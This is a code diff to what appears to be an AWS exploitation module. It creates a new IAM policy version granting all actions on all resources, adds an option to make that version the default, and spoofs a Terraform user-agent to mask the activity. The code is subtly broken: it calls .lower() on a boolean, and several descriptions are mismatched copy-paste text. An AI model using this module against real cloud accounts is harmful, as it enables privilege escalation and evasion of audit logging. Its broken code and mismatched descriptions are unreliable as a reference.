@@ -37,17 +37,37 @@ variables = {
         "value": '{"Version": "2012-10-17", "Statement": [{"Sid": "VisualEditor0", "Effect": "Allow", "Action": "*", "Resource": "*"}]}',
         "required": "true",
         "description": "The password to give to the user. The password needs to be compatible with the password policy configured. Use enum/aws_iam_get_account_password_policy to check it."
+    },
+    "SET-AS-DEFAULT": {
+        "value": 'true',
+        "required": "true",
+        "description": "Weather you want to set the policy version as the default one."
     }
 }
 description = "If an IAM user is not allowed to access the Management Console, you can allow it using a password you want."
 
 aws_command = "aws iam create-login-profile --user-name <user> --password <password> <--password-reset-required OR --no-password-reset-required> --region <region> --profile <profile>"
 
-def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
+def exploit(all_sessions, cred_prof, useragent, web_proxies, callstoprofile):
     policy_arn = variables['POLICY-ARN']['value']
     policy_path = variables['POLICY-PATH']['value']
     policy_document = variables['POLICY-DOCUMENT']['value']
+
+
+    setasdefault = bool(variables['SET-AS-DEFAULT']['value'])
+
+    if setasdefault.lower() == "true":
+        setasdefault = True
+    elif setasdefault.lower() == "false":
+        setasdefault = False
+
+    else:
+        return {
+            "error": f"SET-AS-DEFAULT needs to be true or false"
+        }
+
     currentua = None
+
     try:
         if os.path.exists(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent"):
             with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "r") as uafile:
@@ -82,22 +102,15 @@ def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
         policyresponse = iamprofile.create_policy_version(
             PolicyArn=policy_arn,
             #PolicyPath=policy_path,
-            PolicyDocument=policy_document
+            PolicyDocument=policy_document,
+            SetAsDefault=setasdefault
         )
 
         with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
             uafile.write(
-                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/sts#1.30.1"
+                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/iam#1.30.1"
             )
 
-        stsprofile = giveMeClient(
-            all_sessions=all_sessions,
-            cred_prof=cred_prof,
-            useragent=useragent,
-            web_proxies=web_proxies,
-            service="sts"
-        )
-        stsprofile.get_caller_identity()
         if currentua is not None:
             with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
                 uafile.write(currentua)
